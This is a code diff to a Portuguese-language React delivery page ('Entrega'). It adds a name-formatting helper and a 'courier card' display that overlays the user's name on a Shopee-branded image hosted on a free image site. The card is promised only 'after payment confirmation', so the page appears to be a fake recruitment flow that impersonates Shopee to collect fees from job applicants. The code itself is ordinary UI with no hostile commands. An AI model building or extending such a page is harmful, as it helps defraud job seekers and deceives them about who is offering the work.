@@ -69,6 +69,23 @@ const Entrega: React.FC = () => {
   // Aplica o scroll para o topo quando o componente é montado
   useScrollTop();
   
+  // Função para formatar o nome do cartão
+  const formatCardName = (fullName: string) => {
+    if (!fullName) return 'CANDIDATO';
+    
+    // Lista de preposições a serem removidas
+    const prepositions = ['DOS', 'DAS', 'DA', 'DE', 'DO', 'E'];
+    
+    // Dividir o nome em palavras e converter para maiúsculo
+    const words = fullName.toUpperCase().split(/\s+/).filter(word => word.length > 0);
+    
+    // Filtrar preposições e pegar apenas os dois primeiros nomes válidos
+    const validNames = words.filter(word => !prepositions.includes(word));
+    
+    // Retornar os dois primeiros nomes válidos
+    return validNames.slice(0, 2).join(' ') || 'CANDIDATO';
+  };
+  
   // Inicializar o Facebook Pixel
   useEffect(() => {
     initFacebookPixel();
@@ -595,6 +612,43 @@ const Entrega: React.FC = () => {
               </div>
             </div>
           </div>
+
+          {/* Cartão do usuário */}
+          {dadosUsuario && (
+            <div className="bg-white shadow-md rounded-lg overflow-hidden mb-8">
+              <div className="bg-[#FFF8F6] p-4 border-b border-[#E83D2220]">
+                <h3 className="font-semibold text-[#E83D22]">Seu Cartão de Entregador</h3>
+              </div>
+              <div className="p-6">
+                <div className="flex justify-center">
+                  <div className="text-center">
+                    <div className="relative inline-block">
+                      <img 
+                        src="https://i.ibb.co/VWZ2B4jv/Inserir-um-ti-tulo-4-1-1.webp" 
+                        alt="Cartão Entregador Shopee" 
+                        className="max-w-full w-80 h-auto rounded-2xl"
+                      />
+                      <div 
+                        className="absolute font-bold text-lg tracking-wide"
+                        style={{
+                          bottom: '35px',
+                          left: '30px',
+                          fontFamily: 'Courier New, Courier, monospace',
+                          color: '#FFFFFF',
+                          textShadow: '2px 2px 4px rgba(0,0,0,0.7)'
+                        }}
+                      >
+                        {formatCardName(dadosUsuario.nome)}
+                      </div>
+                    </div>
+                    <p className="mt-4 text-gray-600 text-sm">
+                      Seu cartão personalizado será liberado após a confirmação do pagamento
+                    </p>
+                  </div>
+                </div>
+              </div>
+            </div>
+          )}
           
           <div className="bg-white shadow-md rounded-lg overflow-hidden mb-8">
             <div className="bg-[#FFF8F6] p-4 border-b border-[#E83D2220]">
